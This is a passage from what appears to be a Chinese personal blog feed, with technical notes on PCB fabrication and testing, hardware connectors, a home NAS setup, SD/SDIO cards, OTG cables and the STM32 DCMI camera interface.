src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404130058861.png"></p><p>上图是一个四层板的刨面图，因为其只有四层同层。</p><p>在多层板中，可以通过钻孔来将各铜层之间联系起来，从而实现多层板的功能。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404130100861.png"></p><p>注意：<strong>通孔</strong>和<strong>桩孔</strong>的区别，前者是直接联系上下层，后者是可以联系中间层和上下层的。</p><h2 id="PCB的结构"><a href="#PCB的结构" class="headerlink" title="PCB的结构"></a>PCB的结构</h2><p>印制电路板是以铜箔基板(copper-clad laminate,CCL)作为原料而制造的电器或电子的重要机构组件,了解它们是如何制造出来的,适用于何种产品,它们各有哪些优劣点,才能选择适当的基板。基板是 PCB的材料基础,主要是由<strong>介电层(树脂Resin,玻璃纤维Glass fiber),及高纯度的导体(铜箔Copper foil)二者所构成的复合材料(compositmaterial)。</strong></p><p>基板是由高分子合成树脂和增强材料组成的绝缘层板﹔在基板的表面覆盖着一层导电率较高、焊接性良好的纯铜箔,常用厚度为35～50um;铜箔覆盖在基板一面的覆铜板称为单面覆铜板,基板的两面均覆盖铜箔的覆铜板称为双面覆铜板﹔铜箔能否牢固地覆在基板上,则由黏合剂来完成。</p><p>常用覆铜板的厚度有<code>1.0mm，1.5mm，2.0mm</code>三种。</p><h1 id="PCB的制作"><a href="#PCB的制作" class="headerlink" title="PCB的制作"></a>PCB的制作</h1><p>了解了PCB的分类和结构后,下面介绍PCB的制作过程。</p><p>需要注意的是：双面板、多层板之间的制造过程是不一样的：</p><p>双层板的制作：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404130105007.png"></p><p>多层板的制作过程：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404130105878.png"></p><h2 id="多层板的详细制作流程"><a href="#多层板的详细制作流程" class="headerlink" title="多层板的详细制作流程"></a>多层板的详细制作流程</h2><ol><li>开料<br>开料就是将一张大料根据不同制板要求用机器锯成小料的过程,将大块的覆铜板剪裁成生产板加工尺寸,方便生产加工。</li><li>刨边、洗板<br>开料后的板边角处尖锐,容易划伤手,同时使板与板之间擦花,所以开料后再用圆角机圆角。圆角之后去除版面的氧化层。</li></ol><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404130108361.png"></p><h1 id="关于PCB过孔"><a href="#关于PCB过孔" class="headerlink" title="关于PCB过孔"></a>关于PCB过孔</h1><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202406162342043.png"></p><p>又上面可以知道对于过孔的处理主要在于四种方法：</p><ul><li>过孔开窗</li><li>过孔盖油</li><li>过孔塞油</li><li>过孔赛树脂</li></ul><p>对于一些芯片中间大片开窗的过孔，为了防止漏锡，可以选择塞树脂或塞铜浆。对于普通的过孔，不用考虑漏锡的，双面都是盖油的，可以选择塞油或是盖油。当然，过孔孔内塞上可以有效保护孔壁铜面的。还得看产品的类型和设计需要来定的</p><h1 id="PCB验证"><a href="#PCB验证" class="headerlink" title="PCB验证"></a>PCB验证</h1><p>我们在打印好 PCB 之后，需要对其进行验证，以确保其完好无损。PCB 验证有多种方式。</p><ol><li>直接观察法</li><li>静态测量法</li><li>线上测量法</li></ol><h2 id="1-觀測方法"><a href="#1-觀測方法" class="headerlink" title="1.觀測方法"></a>1.觀測方法</h2><p>這種方法非常直觀，通過仔細檢查，我們可以看到燒傷痕迹。 當出現這種問題時，我們在維護和檢查時應該注意規則，以確保通電時不會有更嚴重的傷害。在使用這種方法時，我們需要注意以下問題：</p><p>1）通過觀察確定PCB板是否被人為損壞。</p><p>2）仔細觀察與此電路板相關的部件，包括每個電容器和電阻器，看是否有黑化現象。 由於無法觀察電阻，只能使用儀器進行量測。 相關損壞部件應及時更換。</p><p>3）應觀察電路板上的集成電路，如CPU、AD和其他相關晶片，並及時修改凸起、燒傷和其他相關情况。</p><h2 id="2-靜態測量方法"><a href="#2-靜態測量方法" class="headerlink" title="2.靜態測量方法"></a>2.靜態測量方法</h2><p>在測試PCB板故障時，通常很難通過觀察發現一些問題，除非它們被燒壞或變形。 然而，在得出結論之前，大多數問題仍然需要用電壓表進行量測。 電路板組件和相關部件應逐一進行測試。 維護步驟應按照以下流程進行：</p><p>1）檢測電源和接地之間的短路，並調查原因。</p><p>2）檢查二極體是否正常。</p><p>3）檢查電容器中是否存在短路甚至開路。 步驟4：檢查與電路板相關的集成電路，以及電阻器和其他相關設備的指示燈。</p><h2 id="3-線上測量方法"><a href="#3-線上測量方法" class="headerlink" title="3.線上測量方法"></a>3.線上測量方法</h2><p>1）接通電路板電源，檢查部件是否過熱。 如果有，檢查並更換相關部件。</p><p>2）檢測PCB板對應的門電路，觀察邏輯是否有問題，並確定晶片的質量。</p><p>3）測試數位電路晶體振盪器的輸出是否正常。</p><p>如何使用萬用表測試部件</p><p>1.電阻量測：萬用表可以量測PCB板上的電阻。 將電路板連接到伏安位置，然後將探針連接到部件的兩端。 觀察萬用表的讀數可以很容易地量測電路板上部件的電阻值。</p><p>2.電容量測：萬用表可以量測電路板上的電容。 將電路板連接到電阻位置，然後將探針連接到部件的兩端。 觀察萬用表的讀數可以很容易地量測PCB板上元件的電容值。</p><p>3.二極體量測：萬用表還可以量測電路板上二極體的正極性和負極性。 將電路板連接到二極體測試位置，然後將探針連接到二極體的兩個埠，觀察萬用表的讀數，即可輕鬆量測二極體的正極性和負極性。</p><p>萬用表可以量測電阻、電容和電感等設備，以確定這些部件是否損壞。 量測電路中是否存在短路或洩漏，尤其是PCB板的開路，以防止燒壞其他部件。</p><h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202406202042046.png"></p><p><a href="https://oshwhub.com/xuzchn/he-zhou-esp32-c3-yin-jiao-quan-yin-chu-tuo-zhan-ban">图片来源</a><br>注意看，上面这个 PCB 将自己作为一个 “芯片” 也就是说通过 <strong>焊盘直接将引脚引出</strong></p><p>完成这样的方法关键在于：<strong>通过焊盘将这些引脚引出</strong></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li>《电路设计、仿真与PCB设计——从模拟电路、数字电路、射频电路、控制电路到信号完整性分析》</li><li>《高质量PCB设计入门》</li><li><a href="https://www.jlc.com/portal/server_guide_15544.html">PCB过孔</a></li><li><a href="https://www.ipcb.com/tw/pcb-blog/10086.html">PCB测试</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>硬件</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常见的硬件备忘录</title>
    <link href="/2024/04/05/%E5%B8%B8%E8%A7%81%E7%9A%84%E7%A1%AC%E4%BB%B6%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <url>/2024/04/05/%E5%B8%B8%E8%A7%81%E7%9A%84%E7%A1%AC%E4%BB%B6%E5%A4%87%E5%BF%98%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>常见的硬件备忘录</p><span id="more"></span><h1 id="常见的硬件备忘录"><a href="#常见的硬件备忘录" class="headerlink" title="常见的硬件备忘录"></a>常见的硬件备忘录</h1><ol><li><p><code>JTAG</code>调试接口中的接口——叫做<strong>简易牛角座排线插头</strong>。其和一般的排插接口的不同点在于，它的上面有一个槽。</p></li><li><p>跳线帽，其作用是：顾名思义，其实将两个没有连接起来的引脚连接起来。可以看霸道原理图中的：</p><p> <img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404052139422.png"></p><p> 使用跳线帽就可以将<code>BOOT</code>引脚和<code>GND</code>引脚或者是上面的<code>3.3V</code>连接起来.</p></li><li><p>电池接口，需要使用特殊的元器件进行连接。</p><p> <img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404152104649.png"></p><p> <img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404152105916.png"></p><p> <strong>嘉立创 <code>XT30UPB-M</code> 电池接口</strong>，或者是使用<strong>板立式注塑型 2PIN 接头</strong>，也可以搜索到。</p><p> 同时在选择电池的时候，也要根据选择的接口来选择电池。</p></li><li><p><strong>DC电源连接器</strong>：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404302326461.png"></p></li><li><p>接线端子：</p><p> 接线端子又可以根据器连接的方式分为一下几种：</p><ul><li>插拔式接线端子<ul><li><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404302338341.png"></li></ul></li><li>螺钉式接线端子<ul><li><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404302338320.png"></li></ul></li><li>弹簧式接线端子<ul><li><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404302339948.png"></li></ul></li><li>栅栏式接线端子<ul><li><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404302339571.png"></li></ul></li></ul></li></ol><p><strong>在这些对于非特别专业类的零件其实在立创商城中提供了一个 <code>看图选型</code> 的功能，由于有很多连接器我们都没有见过、不认识。这种方式可以方便我们更加容易的找到自己想要的零件</strong></p><p><strong>进入立创商城之后-&gt;在首页中找到商品目录-&gt;其中可以查看哪些类别的零件实现了 <code>看图选型</code> 功能，事实上一些非专业类的零件都有 <code>看图选型</code> 功能，比如：连接器、按键&amp;开关等等都具有这种功能</strong></p><ol start="6"><li><p>螺柱，经常用来隔离各个不同的 pcb板 之间，所以螺柱又被称之为 <strong>隔离柱</strong><br>  <img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202406021700377.png"></p></li><li><p>在进行线对板连接器的选择时候需要注意：</p><ol><li>卧式和立式，这两者的区别在于：卧式连接器的排线是水平会 pcb板 的；而立式的连接器的排线是垂直于 pcb板 的。</li><li></li></ol></li></ol>]]></content>
    
    
    <categories>
      
      <category>硬件</category>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>个人NAS服务</title>
    <link href="/2024/03/21/%E4%B8%AA%E4%BA%BANAS%E6%9C%8D%E5%8A%A1/"/>
    <url>/2024/03/21/%E4%B8%AA%E4%BA%BANAS%E6%9C%8D%E5%8A%A1/</url>
    
    <content type="html"><![CDATA[<p>记载NAS服务</p><span id="more"></span><h2 id="3-2-1原则"><a href="#3-2-1原则" class="headerlink" title="3-2-1原则"></a>3-2-1原则</h2><p>备份321原则</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">3</span>：三份副本（完整副本）<br><span class="hljs-number">2</span>：两种介质（机械硬盘<span class="hljs-regexp">/固态硬盘/</span>磁带<span class="hljs-regexp">/光盘/</span>U盘/云）<br><span class="hljs-number">1</span>：一个异地（容灾 火山爆发<span class="hljs-regexp">/海啸/</span>地震）<br></code></pre></td></tr></table></figure><h2 id="我的理念"><a href="#我的理念" class="headerlink" title="我的理念"></a>我的理念</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs css">存储和计算分离 由专用的机器去做 拿网络互联他们<br>跑<span class="hljs-selector-tag">DL</span> 机器完全能放下整个dataset 那就不分离<br><br>正常家用需求：<br>影视共享、下载机、照片分享<br>多用户管理（家人/朋友）<br>文件分享、文件收集<br><br>不差钱、懒得折腾推荐白群晖<br>差钱、懒得折腾推荐白威联通<br>差钱、眼馋群晖的软件、喜欢折腾推荐黑群晖<br><br>自己折腾：自组PVE + 喜欢的NAS系统<br>喜欢ZFS（理念先进）：自组TrueNAS - 有容器需求Scale 没有选Core<br>读多写少（媒体服务器）：Unraid<br></code></pre></td></tr></table></figure><h2 id="我的主力NAS"><a href="#我的主力NAS" class="headerlink" title="我的主力NAS"></a>我的主力NAS</h2><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs dns">Core：TrueNAS Core<br>天箭座 畅网微控<br>J<span class="hljs-number">6413 4核4</span>线程<br><span class="hljs-number">32</span>G内存<br>目前位置：南京 公司<br>PVE上的虚拟化 TrueNAS<br><br>QNAP：威联通（正版）<br>TS453D-mini<br>J<span class="hljs-number">4125 4核4</span>线程<br><span class="hljs-number">16</span>G内存<br>目前位置：徐州 家里<br>应用较多 官方给的相册 AI识别能力 比较好用<br>手机APP也是一直在更新 QFile Pro 目前已经比较好用了<br>自带异地组网 对小白比较友好<br><br>Pro：Unraid Pro<br>自组 万由<span class="hljs-number">810</span><span class="hljs-keyword">A</span><br>G<span class="hljs-number">5905 2核2</span>线程<br><span class="hljs-number">24</span>G内存<br>目前位置：南京 家里<br>Unraid官方定位：媒体服务器<br>小型的PVE 有一些docker容器管理和虚拟机管理等功能<br>缺点：机箱给主板的pcie口不好用 不好拓展<br><br>三台互联机制：WireGuard + IPv6（手动管理）<br></code></pre></td></tr></table></figure><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><p>SMB静默损坏</p><p><a href="https://www.chiphell.com/thread-2465332-1-1.html">https://www.chiphell.com/thread-2465332-1-1.html</a></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">Q1：如何确保文件还是那个文件？<br><span class="hljs-built_in">A1</span>：哈希值比对（自己开发的完整性校验小程序）<br><br>Q2：如何确保云上文件安全？<br><span class="hljs-built_in">A2</span>：AES<span class="hljs-number">-256</span>加密<br><br>Q3：如何在转移大量文件时确保可靠（断点续传）？<br><span class="hljs-built_in">A3</span>：rsync + 为了保险还可以做额外哈希值比对<br><br>Q4：文件在终端上的话，怎么确保和远端一致？<br><span class="hljs-built_in">A4</span>：给每个文件集编号 引入版本管理<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>NAS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SD卡</title>
    <link href="/2024/03/14/SD%E5%8D%A1/"/>
    <url>/2024/03/14/SD%E5%8D%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>SD卡(Secure Digital Memory Card)在我们生活中已经非常普遍了，控制器对SD卡进行读写通信操作一般有两种通信接口可选：</p><ol><li>一种是SPI接口</li><li>另外一种就是SDIO接口。SDIO全称是安全数字输入&#x2F;输出接口，多媒体卡(MMC)、SD卡、SD I&#x2F;O卡都有SDIO接口。 stm32f4xx系列控制器有一个SDIO主机接口，它可以与MMC卡、SD卡、SD I&#x2F;O卡以及CE-ATA设备进行数据传输。</li></ol><ul><li>MMC卡可以说是SD卡的前身， 现阶段已经用得很少。</li><li>SD I&#x2F;O卡本身不是用于存储的卡，它是指利用SDIO传输协议的一种外设。<ul><li>比如Wi-Fi Card， 它主要是提供Wi-Fi功能，有些Wi-Fi模块是使用串口或者SPI接口进行通信的，但Wi-Fi SDIO Card是使用SDIO接口进行通信的。 并且一般设计SD I&#x2F;O卡是可以插入到SD的插槽。</li></ul></li><li>CE-ATA是专为轻薄笔记本硬盘设计的硬盘高速通讯接口。</li></ul><p><strong>在stm32中可以使用片上外设<code>SPI</code>和<code>SDIO</code>来对这些卡进行控制</strong>：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403142034645.png"></p><p>即使目前SD协议提供的SD卡规范版本最新是4.01版本，但stm32f4xx系列控制器只支持SD卡规范版本2.0， <strong>即只支持标准容量SD和高容量SDHC标准卡，不支持超大容量SDXC标准卡，所以可以支持的最高卡容量是32GB。</strong></p><h1 id="SD卡的物理结构"><a href="#SD卡的物理结构" class="headerlink" title="SD卡的物理结构"></a>SD卡的物理结构</h1><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403142036190.png"></p><p>从上图来看，SD卡主要由五个部分组成，并且其有<code>8</code>个寄存器，这些寄存器是用来设置SD卡的信息的。<strong>这些寄存器只能通过对应的命令访问， 对SD卡进行控制操作并不是像操作控制器GPIO相关寄存器那样一次读写一个寄存器的，它是通过命令来控制， SDIO定义了64个命令，每个命令都有特殊意义，可以实现某一特定功能，SD卡接收到命令后， 根据命令要求对SD卡内部寄存器进行修改，程序控制中只需要发送组合命令就可以实现SD卡的控制以及读写操作。</strong></p><p>各个寄存器的作用：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403142038135.png"></p><p>SD的引脚是<strong>9</strong>根：</p><ul><li><p>CLK：时钟线，由SDIO主机产生，即由STM32控制器输出；</p></li><li><p>CMD：命令控制线，SDIO主机通过该线发送命令控制SD卡，如果命令要求SD卡提供应答(响应)，SD卡也是通过该线传输应答信息；</p></li><li><p>D0-3：数据线，传输读写数据；SD卡可将D0拉低表示忙状态；</p></li><li><p>VDD、VSS1、VSS2：电源和地信号。</p></li></ul><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403142204724.png"></p><p>注：</p><ul><li>S：电源供给</li><li>I：输入</li><li>O：采用推拉驱动的输出</li><li>PP：采用推拉驱动的输入输出</li></ul><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>OTG线和USB线</title>
    <link href="/2024/03/10/OTG%E7%BA%BF%E5%92%8CUSB%E7%BA%BF/"/>
    <url>/2024/03/10/OTG%E7%BA%BF%E5%92%8CUSB%E7%BA%BF/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我们知道，标准的USB使用主从式的架构，USB主机端（即电脑）是“主”，而USB周边设备是“从”。只有USB主机端可以调度该链接的设置与资料传输。USB周边设备不能够自行启动资料传输，只能回应服务器的指令。</p><p>USB OTG改变了这种状况，配件不再需要一定要成为单纯的周边设备，它们有时候也可以成为主机端。举例来说，USB打印机与电脑连接时作为电脑的外界周边被电脑控制，与其他USB储存设备连接时作为控制主机来读取储存设备；平板电脑等手持智能终端与电脑连接时主要作为电脑的储存设备等，单独与USB储存设备或USB输入设备连接时则作为这些接入设备的主机来操控储存设备或接收输入。</p><p>随着手机的不断普及，OTG线也不断普及。OTG(On The Go)线和USB线是不同的，虽然，前者是在后者的基础上进行的扩展。</p><p>主要的扩展内容就是：<strong>OTG线可以使得从机变为主机</strong>。例如：USB数据线用来连接手机和电脑，可通过电脑访问手机里面的照片、音乐，把手机当做U盘使用。OTG数据线则无需PC，手机可直接通过OTG数据线与U盘、鼠标、键盘等USB设备连接。接U盘直接查找资料，接鼠标方便玩游戏，接键盘可快速打字，接相机直接浏览图片，即拍即传。OTG扩展了手机的功能。</p><h1 id="物理结构上的差异"><a href="#物理结构上的差异" class="headerlink" title="物理结构上的差异"></a>物理结构上的差异</h1><p>OTG先对于一般的USB线，OTG 线一端有一根PIN多接了个ID接地线，让机器分辨谁是主机、谁是Device外设，单以外观是无法分辨 OTG线与普通USB线的区别的 。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403102354241.png"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://zh.wikipedia.org/wiki/USB_On-The-Go#%E6%8E%A5%E5%8F%A3">https://zh.wikipedia.org/wiki/USB_On-The-Go#%E6%8E%A5%E5%8F%A3</a></p><p><a href="https://developer.aliyun.com/article/48010P">https://developer.aliyun.com/article/48010P</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>stm32-DCMI摄像头</title>
    <link href="/2024/03/08/stm32-DCMI%E6%91%84%E5%83%8F%E5%A4%B4/"/>
    <url>/2024/03/08/stm32-DCMI%E6%91%84%E5%83%8F%E5%A4%B4/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><code>stm32</code>系列中，<code>f4</code>带有DCMI外设。</p><p>所使用的摄像头是<code>ov5640</code>。关于这个摄像头的有关信息可以去这里找到：</p><h1 id="SCCB时序"><a href="#SCCB时序" class="headerlink" title="SCCB时序"></a>SCCB时序</h1><p>由于<code>ov5640</code>使用的是<code>SCCB</code>时序. 并且<code>SCCB</code>时序还<code>IIC</code>时序非常相似. 二者的异同如下:</p><p><strong>不同点</strong>:</p><ul><li><code>SCCB</code>一次只可以读或写一个字节的数据，而<code>IIC</code>是可以多个字节的。</li></ul><p><strong>相同点</strong>：<br>SCCB的起始信号、停止信号及数据有效性与I2C完全一样。</p><ul><li><p>起始信号：在SIO_C为高电平时，SIO_D出现一个下降沿，则SCCB开始传输。</p></li><li><p>停止信号：在SIO_C为高电平时，SIO_D出现一个上升沿，则SCCB停止传输。</p></li><li><p>数据有效性：除了开始和停止状态，在数据传输过程中，当SIO_C为高电平时，必须保证SIO_D上的数据稳定， 也就是说，SIO_D上的电平变换只能发生在SIO_C为低电平的时候，SIO_D的信号在SIO_C为高电平时被采集。</p></li></ul><p>时序图如下：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403081639874.png"></p><h2 id="SCCB的读时序"><a href="#SCCB的读时序" class="headerlink" title="SCCB的读时序"></a>SCCB的读时序</h2><p>读时序的步骤一共是两步：</p><ol><li>发送从设备的设备ID+R标志(设备地址+读方向标志)和自由位</li><li>读取寄存器中的8位数据和写NA位(非应答信号)</li></ol><h2 id="SCCB的写时许"><a href="#SCCB的写时许" class="headerlink" title="SCCB的写时许"></a>SCCB的写时许</h2><p>写时序主要分为三步写时许和两步写时序</p><p>三步写时序：</p><ol><li>首先发送从设备的<code>ID</code>地址+<code>w</code>标志</li><li>在发送从设备的<strong>八位地址</strong></li><li>最后发送一字节的内容</li></ol><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403081644234.png"></p><p>两步写时许：这个时序主要是用来和读时序一起使用的，由于读操作没有提供目标寄存器的地址，所以需要一个两步写操作来提供。</p><ol><li>发送从设备的<code>ID</code>地址</li><li>发送从设备的<strong>八位</strong>地址</li></ol><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403081644771.png"></p><h1 id="DCMI外设"><a href="#DCMI外设" class="headerlink" title="DCMI外设"></a>DCMI外设</h1><p>DCMI，数字摄像头接口(Digital cameraInterface)。在<code>stm32f4xx</code>系列单片机中提供了这个外设。</p><p>其作用为：<br>它支持使用上述类似VGA的时序获取图像数据流，支持原始的按行、帧格式来组织的图像数据，如YUV、RGB， 也支持接收JPEG格式压缩的数据流。接收数据时，主要使用HSYNC及VSYNC信号来同步。</p><p><strong>其实就是接收图像数据</strong></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403081655665.png"></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403081655276.png"></p><h1 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint16_t</span> DCMI_CaptureMode;      <span class="hljs-comment">/*选择连续模式或拍照模式 */</span><br>    <span class="hljs-type">uint16_t</span> DCMI_SynchroMode;      <span class="hljs-comment">/*选择硬件同步模式还是内嵌码模式 */</span><br>    <span class="hljs-type">uint16_t</span> DCMI_PCKPolarity;      <span class="hljs-comment">/*设置像素时钟的有效电平*/</span><br>    <span class="hljs-type">uint16_t</span> DCMI_VSPolarity;       <span class="hljs-comment">/*设置VSYNC的有效电平*/</span><br>    <span class="hljs-type">uint16_t</span> DCMI_HSPolarity;       <span class="hljs-comment">/*设置HSYNC的有效电平*/</span><br>    <span class="hljs-type">uint16_t</span> DCMI_CaptureRate;      <span class="hljs-comment">/*设置图像的采集间隔 */</span><br>    <span class="hljs-type">uint16_t</span> DCMI_ExtendedDataMode; <span class="hljs-comment">/*设置数据线的宽度 */</span><br>&#125; DCMI_InitTypeDef;<br></code></pre></td></tr></table></figure><p>极性：极性就是初始电平是高还是低</p><p>相位: 相位就是从第一个跳变沿可以检测还是从第二个跳变沿开始检测</p><h2 id="参数解释"><a href="#参数解释" class="headerlink" title="参数解释"></a>参数解释</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs txt">(1) DCMI_CaptureMode<br><br>本成员设置DCMI的捕获模式， 可以选择为连续摄像(DCMI_CaptureMode_Continuous)或单张拍照DCMI_CaptureMode_SnapShot。<br><br>(2) DCMI_SynchroMode<br><br>本成员设置DCMI数据的同步模式， 可以选择为硬件同步方式(DCMI_SynchroMode_Hardware)或内嵌码方式(DCMI_SynchroMode_Embedded)。<br><br>(3) DCMI_PCKPolarity<br><br>本成员用于配置DCMI接口像素时钟的有效边沿，即在该时钟边沿时，DCMI会对数据线上的信号进行采样， 它可以被设置为上升沿有效(DCMI_PCKPolarity_Rising)或下降沿有效(DCMI_PCKPolarity_Falling)。<br><br>(4) DCMI_VSPolarity<br><br>本成员用于设置VSYNC的有效电平，当VSYNC信号线表示为有效电平时，表示新的一帧数据传输完成， 它可以被设置为高电平有效(DCMI_VSPolarity_High)或低电平有效(DCMI_VSPolarity_Low)。<br><br>(5) DCMI_HSPolarity<br><br>类似地，本成员用于设置HSYNC的有效电平，当HSYNC信号线表示为有效电平时，表示新的一行数据传输完成， 它可以被设置为高电平有效(DCMI_HSPolarity_High)或低电平有效(DCMI_HSPolarity_Low)。<br><br>(6) DCMI_CaptureRate<br><br>本成员可以用于设置DCMI捕获数据的频率，可以设置为全采集、半采集或1/4采集(DCMI_CaptureRate_All_Frame/ 1of2_Frame/ 1of4_Frame)， 在间隔采集的情况下，STM32的DCMI外设会直接按间隔丢弃数据。<br><br>(7) DCMI_ExtendedDataMode<br><br>本成员用于设置DCMI的数据线宽度，可配置为8/10/12及14位数据线宽(DCMI_ExtendedDataMode_8b/10b/12b/14b)。<br></code></pre></td></tr></table></figure><h3 id="捕获模式"><a href="#捕获模式" class="headerlink" title="捕获模式"></a>捕获模式</h3><p>其中的捕获模式含义为：<strong>分别为快照模式和连续采集模式。快照模式时只采集一帧的图像数据，连续采集模式会一直采集多个帧的数据， 并且可以通过配置捕获率来控制采集多少数据，如可配置为采集所有数据或隔1帧采集一次数据或隔3帧采集一次数据。</strong></p><h3 id="同步模式"><a href="#同步模式" class="headerlink" title="同步模式"></a>同步模式</h3><p><strong>参数解释中的同步模式</strong>：</p><ul><li>硬件同步</li><li>内嵌码同步</li></ul><p>硬件同步就是使用<code>HSYNC</code>和<code>VSYNC</code>两种模式进行同步。</p><p>内嵌码同步：<br>而内嵌码同步的方式是使用数据信号线传输中的特定编码来表示同步信息，由于需要用0x00和0xFF来表示编码， 所以表示图像的数据中不能包含有这两个值。利用这两个值，它扩展到4个字节，定义出了2种模式的同步码，每种模式包含4个编码， 编码格式为0xFF0000XY，其中XY的值可通过寄存器设置。当DCMI接收到这样的编码时，它不会把这些当成图像数据， 而是按照表 两种模式的内嵌码 中的编码来解释，作为同步信号。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403091707392.png"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://doc.embedfire.com/mcu/stm32/f407batianhu/std/zh/latest/book/DCMI_OV5640.html">https://doc.embedfire.com/mcu/stm32/f407batianhu/std/zh/latest/book/DCMI_OV5640.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>摄像头模块</title>
